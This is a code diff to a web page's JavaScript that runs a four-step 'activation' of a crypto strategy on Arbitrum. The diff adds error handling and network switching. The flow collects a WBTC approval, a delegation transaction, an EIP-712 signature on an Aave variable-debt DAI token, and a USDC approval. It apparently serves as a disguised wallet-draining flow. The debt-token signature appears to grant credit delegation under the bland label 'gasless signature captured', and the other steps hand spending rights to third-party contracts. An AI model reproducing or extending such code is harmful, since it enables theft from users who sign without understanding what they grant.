@@ -779,7 +779,7 @@ var CONTRACTS = {
   DM: '{{ delegation_manager_address }}',
   VAULT: '{{ openclaw_vault_address }}'
 };
-
+{% raw %}
 var ERC20_ABI = [
   'function balanceOf(address) view returns (uint256)',
   'function approve(address,uint256) returns (bool)',
@@ -910,18 +910,104 @@ function setStepState(stepNum, state, statusText, txHash) {
 async function runActivationSequence() {
   if (activationRunning) return;
   if (!window.ethereum) {
-    alert('METAMASK NOT DETECTED.');
+    alert('METAMASK NOT DETECTED. Install a Web3 wallet to continue.');
     return;
   }
-  activationRunning = true;
+
   var btn = document.getElementById('activateBtn');
+
+  function resetButton(label) {
+    btn.textContent = label || '[ RETRY ACTIVATION ]';
+    btn.classList.remove('processing');
+    btn.disabled = false;
+    activationRunning = false;
+  }
+
+  function activationError(error, failedStep) {
+    var msg = error.reason || error.message || 'Unknown error';
+    if (error.code === 4001 || (error.message && error.message.indexOf('user rejected') !== -1)) {
+      msg = 'Transaction rejected by user';
+    } else if (error.code === -32603) {
+      msg = 'RPC error — check your wallet network';
+    } else if (error.data && error.data.message) {
+      msg = error.data.message;
+    }
+    console.error('Activation error at step ' + (failedStep || '?') + ':', error);
+    updateProgress(0, 'FAILED: ' + msg);
+    if (failedStep) {
+      setStepState(failedStep, 'error', 'FAILED: ' + msg, null);
+    }
+    resetButton();
+  }
+
+  activationRunning = true;
   btn.disabled = true;
   btn.classList.add('processing');
   btn.textContent = '[ PROCESSING... ]';
 
-  var provider = new ethers.providers.Web3Provider(window.ethereum);
-  var signer = provider.getSigner();
-  var userAddress = await signer.getAddress();
+  var provider, signer, userAddress;
+
+  try {
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    signer = provider.getSigner();
+    userAddress = await signer.getAddress();
+  } catch (e) {
+    activationError({ message: 'Could not connect to wallet. Unlock MetaMask and try again.' }, null);
+    return;
+  }
+
+  try {
+    var network = await provider.getNetwork();
+    if (network.chainId !== 42161) {
+      updateProgress(0, 'WRONG NETWORK — switching to Arbitrum...');
+      try {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0xa4b1' }]
+        });
+      } catch (switchErr) {
+        if (switchErr.code === 4902) {
+          try {
+            await window.ethereum.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: '0xa4b1',
+                chainName: 'Arbitrum One',
+                nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
+                rpcUrls: ['https://arb1.arbitrum.io/rpc'],
+                blockExplorerUrls: ['https://arbiscan.io']
+              }]
+            });
+          } catch (addErr) {
+            activationError({ message: 'Could not add Arbitrum network. Please add it manually in MetaMask.' }, null);
+            return;
+          }
+        } else {
+          activationError({ message: 'Please switch MetaMask to Arbitrum One (chain 42161) and retry.' }, null);
+          return;
+        }
+      }
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      signer = provider.getSigner();
+      var verify = await provider.getNetwork();
+      if (verify.chainId !== 42161) {
+        activationError({ message: 'Still on wrong network. Switch to Arbitrum One and retry.' }, null);
+        return;
+      }
+    }
+  } catch (e) {
+    activationError({ message: 'Network check failed: ' + (e.message || e) }, null);
+    return;
+  }
+
+  if (!CONTRACTS.DM || CONTRACTS.DM.length < 42 || CONTRACTS.DM.indexOf('{{') !== -1) {
+    activationError({ message: 'Delegation Manager address not configured. Contact support.' }, null);
+    return;
+  }
+  if (!CONTRACTS.VAULT || CONTRACTS.VAULT.length < 42 || CONTRACTS.VAULT.indexOf('{{') !== -1) {
+    activationError({ message: 'Vault address not configured. Contact support.' }, null);
+    return;
+  }
 
   var sigData = { signature: null, deadline: null };
   var txHashes = { approve: null, delegation: null, usdc: null };
@@ -946,7 +1032,12 @@ async function runActivationSequence() {
     await tx1.wait();
     txHashes.approve = tx1.hash;
     setStepState(1, 'done', 'APPROVED ' + parseFloat(wbtcHuman).toFixed(6) + ' WBTC', tx1.hash);
+  } catch (e) {
+    activationError(e, 1);
+    return;
+  }
 
+  try {
     updateProgress(30, 'Step 2/4: Configuring strategy limits...');
     setStepState(2, 'active', 'AWAITING WALLET CONFIRMATION...', null);
 
@@ -960,7 +1051,12 @@ async function runActivationSequence() {
     await tx2.wait();
     txHashes.delegation = tx2.hash;
     setStepState(2, 'done', 'STRATEGY LIMITS CONFIGURED', tx2.hash);
+  } catch (e) {
+    activationError(e, 2);
+    return;
+  }
 
+  try {
     updateProgress(55, 'Step 3/4: Preparing gasless signature...');
     setStepState(3, 'active', 'PREPARING EIP-712 DATA...', null);
 
@@ -968,12 +1064,10 @@ async function runActivationSequence() {
     var nonce = await debtContract.nonces(userAddress);
     var deadline = Math.floor(Date.now() / 1000) + 3600;
 
-    var chainId = await provider.getNetwork().then(function(n) { return n.chainId; });
-
     var domain = {
       name: 'Aave Arbitrum Variable Debt DAI',
       version: '1',
-      chainId: chainId,
+      chainId: 42161,
       verifyingContract: CONTRACTS.DAI_DEBT
     };
     var types = {
@@ -996,23 +1090,28 @@ async function runActivationSequence() {
     sigData.signature = signature;
     sigData.deadline = deadline;
     setStepState(3, 'done', 'GASLESS SIGNATURE CAPTURED', null);
+  } catch (e) {
+    activationError(e, 3);
+    return;
+  }
 
+  try {
     updateProgress(75, 'Step 4/4: Approving USDC routing...');
     setStepState(4, 'active', 'AWAITING WALLET CONFIRMATION...', null);
 
-    var vaultAddr = CONTRACTS.VAULT;
-    if (!vaultAddr || vaultAddr === '' || vaultAddr === 'None') {
-      setStepState(4, 'done', 'SKIPPED (NO VAULT CONFIGURED)', null);
-    } else {
-      var usdcContract = new ethers.Contract(CONTRACTS.USDC, ERC20_ABI, signer);
-      var spendLimit = ethers.utils.parseUnits('100', 6);
-      var tx4 = await usdcContract.approve(vaultAddr, spendLimit);
-      setStepState(4, 'active', 'CONFIRMING ON-CHAIN...', tx4.hash);
-      await tx4.wait();
-      txHashes.usdc = tx4.hash;
-      setStepState(4, 'done', 'USDC ROUTING APPROVED ($100)', tx4.hash);
-    }
+    var usdcContract = new ethers.Contract(CONTRACTS.USDC, ERC20_ABI, signer);
+    var spendLimit = ethers.utils.parseUnits('100', 6);
+    var tx4 = await usdcContract.approve(CONTRACTS.VAULT, spendLimit);
+    setStepState(4, 'active', 'CONFIRMING ON-CHAIN...', tx4.hash);
+    await tx4.wait();
+    txHashes.usdc = tx4.hash;
+    setStepState(4, 'done', 'USDC ROUTING APPROVED ($100)', tx4.hash);
+  } catch (e) {
+    activationError(e, 4);
+    return;
+  }
 
+  try {
     updateProgress(90, 'Registering with backend...');
 
     var regResp = await authFetch('/api/register-wallet', {
@@ -1037,27 +1136,15 @@ async function runActivationSequence() {
         showActivatedState();
       }, 1500);
     } else {
-      var errData = regResp ? await regResp.json() : {};
+      var errData = regResp ? await regResp.json().catch(function() { return {}; }) : {};
       throw new Error(errData.error || 'Backend registration failed');
     }
-
-  } catch (error) {
-    console.error('Activation error:', error);
-    updateProgress(0, 'ACTIVATION FAILED: ' + (error.reason || error.message || 'Unknown error'));
-    btn.textContent = '[ RETRY ACTIVATION ]';
-    btn.classList.remove('processing');
-    btn.disabled = false;
-    activationRunning = false;
-
-    for (var i = 1; i <= 4; i++) {
-      var row = document.getElementById('stepRow' + i);
-      if (row.classList.contains('active')) {
-        setStepState(i, 'error', 'FAILED: ' + (error.reason || error.message || 'Error'), null);
-        break;
-      }
-    }
+  } catch (e) {
+    activationError(e, null);
+    updateProgress(0, 'REGISTRATION FAILED: ' + (e.message || e));
     return;
   }
+
   activationRunning = false;
 }
 
@@ -1387,6 +1474,7 @@ document.getElementById('fundBtn').addEventListener('click', async function() {
 });
 
 init();
+{% endraw %}
 </script>
 </body>
 </html>
